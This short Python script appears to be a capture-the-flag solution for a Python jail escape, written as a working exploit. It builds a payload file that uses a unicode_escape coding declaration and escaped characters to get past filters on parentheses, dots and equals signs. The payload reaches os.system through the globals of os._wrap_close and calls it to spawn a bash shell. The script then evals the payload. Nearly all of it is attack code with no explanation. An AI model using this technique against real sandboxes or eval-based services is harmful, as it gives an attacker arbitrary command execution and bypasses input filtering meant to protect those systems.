with open('solve.txt', 'wb') as f:
    bts = bytearray()
    bts += b"#coding:unicode_escape"
    bts += b'\r\\u000a[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "_wrap_close"][0].close.__globals__["system"]("bash")\n' \
        .replace(b'(', b"\\u0028") \
        .replace(b')', b"\\u0029") \
        .replace(b'=', b"\\u003d") \
        .replace(b'.', b"\\u002e")
    f.write(bts)

with open('solve.txt', 'rb') as f:
    text = f.read()
    print(text)
    print(text.decode('unicode_escape'))
    eval(text)
